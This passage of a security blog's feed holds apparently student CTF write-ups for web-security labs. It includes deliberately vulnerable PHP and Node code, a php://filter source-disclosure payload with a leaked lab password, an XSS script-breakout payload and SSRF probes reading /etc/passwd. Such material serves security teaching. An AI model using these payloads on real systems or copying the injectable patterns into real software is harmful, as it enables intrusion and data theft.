 &amp;lt;div id=&amp;#34;navbarBasicExample&amp;#34; class=&amp;#34;navbar-menu&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;navbar-start&amp;#34;&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;
 Home
 &amp;lt;/a&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/about&amp;#34;&amp;gt;
 About
 &amp;lt;/a&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/admin.php&amp;#34;&amp;gt;
 Admin
 &amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/nav&amp;gt;

 &amp;lt;div class=&amp;#34;container&amp;#34; style=&amp;#34;margin-top: 1em;&amp;#34;&amp;gt;
 &amp;lt;?php
 if (isset($_GET[&amp;#39;page&amp;#39;]))
 include($_GET[&amp;#39;page&amp;#39;] . &amp;#34;.php&amp;#34;);
 else
 include(&amp;#34;inc/home.php&amp;#34;);
 ?&amp;gt;
 &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Observe page source code
We know that &lt;code>admin.php&lt;/code> is under &lt;code>/&lt;/code> directory.
&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin&lt;/code>
:::spoiler admin source code
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;h1&amp;gt;Admin Panel&amp;lt;/h1&amp;gt;
&amp;lt;form&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;admin&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;password&amp;#34; name=&amp;#34;password&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php
$admin_account = array(&amp;#34;username&amp;#34; =&amp;gt; &amp;#34;admin&amp;#34;, &amp;#34;password&amp;#34; =&amp;gt; &amp;#34;kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&amp;#34;);
if (
 isset($_GET[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;]) &amp;amp;&amp;amp;
 $_GET[&amp;#39;username&amp;#39;] === $admin_account[&amp;#39;username&amp;#39;] &amp;amp;&amp;amp; $_GET[&amp;#39;password&amp;#39;] === $admin_account[&amp;#39;password&amp;#39;]
) {
 echo &amp;#34;&amp;lt;h1&amp;gt;LOGIN SUCCESS!&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;&amp;#34;.getenv(&amp;#39;FLAG&amp;#39;).&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;;
}

?&amp;gt;
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Then we get admin password is: &lt;code>kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&lt;/code>. Then we got flag!!!&lt;/li>
&lt;/ol></description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</guid><description>&lt;h1 id="simple-web-0x09lab---dns-lookup-tool">
 Simple Web 0x09(Lab - DNS Lookup Tool)
 &lt;a class="anchor" href="#simple-web-0x09lab---dns-lookup-tool">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8300/">http://h4ck3r.quest:8300/&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;DNS Lookup Tool | Baby&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
 &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍&amp;lt;/h1&amp;gt;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
 &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
 Lookup!
 &amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;br&amp;gt;
 &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
 &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
 &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
 &amp;lt;pre&amp;gt;&amp;lt;?= shell_exec(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;) ?&amp;gt;&amp;lt;/pre&amp;gt;
 &amp;lt;/section&amp;gt;
 &amp;lt;?php endif; ?&amp;gt;
 &amp;lt;hr&amp;gt;
 &amp;lt;a id=&amp;#34;magic&amp;#34;&amp;gt;Magic&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;article class=&amp;#34;message is-link is-hidden is-size-4&amp;#34; id=&amp;#34;hint&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;message-body is-family-monospace&amp;#34;&amp;gt;
 host &amp;#39;&amp;lt;span class=&amp;#34;has-text-danger&amp;#34; id=&amp;#34;command&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;#39;;
 &amp;lt;/div&amp;gt;
 &amp;lt;/article&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/section&amp;gt;

 &amp;lt;script&amp;gt;
 magic.onclick = () =&amp;gt; hint.classList.toggle(&amp;#34;is-hidden&amp;#34;);
 window.onload = hostname.oninput = () =&amp;gt; command.textContent = hostname.value;
 &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt; 
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</guid><description>&lt;h1 id="simple-web-0x10lab---dns-lookup-tool--waf">
 Simple Web 0x10(Lab - DNS Lookup Tool | WAF)
 &lt;a class="anchor" href="#simple-web-0x10lab---dns-lookup-tool--waf">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/7b8uMzpCfug?t=3612">2022/03/30 網頁安全&lt;/a>
&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command injection&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;DNS Lookup Tool | WAF&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
 &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍 | WAF Edition&amp;lt;/h1&amp;gt;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
 &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
 Lookup!
 &amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;br&amp;gt;
 &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
 &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
 &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
 &amp;lt;pre&amp;gt;
 &amp;lt;?php
 $blacklist = [&amp;#39;|&amp;#39;, &amp;#39;&amp;amp;&amp;#39;, &amp;#39;;&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;&amp;lt;&amp;#39;, &amp;#34;\n&amp;#34;, &amp;#39;flag&amp;#39;];
 $is_input_safe = true;
 foreach ($blacklist as $bad_word)
 if (strstr($_POST[&amp;#39;name&amp;#39;], $bad_word) !== false) $is_input_safe = false;

 if ($is_input_safe)
 system(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;);
 else
 echo &amp;#34;HACKER!!!&amp;#34;;
 ?&amp;gt;
 &amp;lt;/pre&amp;gt;
 &amp;lt;/section&amp;gt;
 &amp;lt;?php endif; ?&amp;gt;
 &amp;lt;hr&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/section&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt; 
&lt;/code>&lt;/pre>&lt;p>:::
It set some protection such as blacklist.&lt;/p></description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</guid><description>&lt;h1 id="simple-web-0x11lab---xss-me">
 Simple Web 0x11(Lab - XSS Me)
 &lt;a class="anchor" href="#simple-web-0x11lab---xss-me">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8800/">http://h4ck3r.quest:8800/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler
攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取&lt;code>COOKIE&lt;/code>之類的)
&lt;img src="https://i.imgur.com/lZ0bj41.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/grJXpr7.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/q9fwa6z.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;User not found.&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Check XSS
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;youshallnotpass&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/OffMAUF.png" alt="" />&lt;/li>
&lt;li>Try to inject script tag
Payload: &lt;code>http://h4ck3r.quest:8800/?type=error&amp;amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E//&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;//&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/1cZJvIv.png" alt="" />&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>Hint
If you login as guest(password = guest), then you can get the response
&lt;img src="https://i.imgur.com/s2R75Xf.png" alt="" />&lt;/li>
&lt;/ul>
&lt;ol start="3">
&lt;li>
&lt;p>Fetch flag and send to &lt;a href="https://beeceptor.com/">beeceptor&lt;/a>
Payload:&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
 Simple Web 0x12(Lab - Web Preview Card)
 &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="exploit---ssrf">
 Exploit - SSRF
 &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
&lt;/h2>
&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Test it
&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Analyze &lt;code>flag.php&lt;/code>
&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
?&amp;gt;
&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php
if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
 echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::
If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
 Simple Web 0x12(Lab - Web Preview Card)
 &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="exploit---ssrf">
 Exploit - SSRF
 &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
&lt;/h2>
&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Test it
&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Analyze &lt;code>flag.php&lt;/code>
&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
?&amp;gt;
&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php
if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
 echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::
If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</guid><description>&lt;h1 id="simple-web-0x13lab---ssrfrog">
 Simple Web 0x13(Lab - SSRFrog)
 &lt;a class="anchor" href="#simple-web-0x13lab---ssrfrog">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8501/">http://h4ck3r.quest:8501/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://pjchender.dev/javascript/js-set/">javascript Set()&lt;/a>
&lt;a href="https://youtu.be/hWC-Evt-sBc?t=9867">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#34;express&amp;#34;);
const http = require(&amp;#34;http&amp;#34;);

const app = express();

app.get(&amp;#34;/source&amp;#34;, (req, res) =&amp;gt; {
 return res.sendFile(__filename);
})
app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 const { url } = req.query;
 if (!url || typeof url !== &amp;#39;string&amp;#39;) return res.sendFile(__dirname + &amp;#34;/index.html&amp;#34;);

 // no duplicate characters in `url`
 if (url.length !== new Set(url).size) return res.sendFile(__dirname + &amp;#34;/frog.png&amp;#34;);

 try {
 http.get(url, resp =&amp;gt; {
 resp.setEncoding(&amp;#34;utf-8&amp;#34;);
 resp.statusCode === 200 ? resp.on(&amp;#39;data&amp;#39;, data =&amp;gt; res.send(data)) : res.send(&amp;#34;:(&amp;#34;);
 }).on(&amp;#39;error&amp;#39;, () =&amp;gt; res.send(&amp;#34;WTF?&amp;#34;));
 } catch (error) {
 res.send(&amp;#34;WTF?&amp;#34;);
 }
});

app.listen(3000, &amp;#39;0.0.0.0&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</guid><description>&lt;h1 id="simple-web-0x14lab---debug">
 Simple Web 0x14(Lab - Debug)
 &lt;a class="anchor" href="#simple-web-0x14lab---debug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9020/">http://h4ck3r.quest:9020/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, Response
import urllib.request
import json

app = Flask(__name__)

app.config[&amp;#39;FLAG&amp;#39;] = &amp;#34;FL4G{fake_flag}&amp;#34;

@app.route(&amp;#39;/&amp;#39;)
def index():
 return &amp;#39;&amp;#39;&amp;#39;
&amp;lt;form action=&amp;#34;/proxy&amp;#34;&amp;gt;
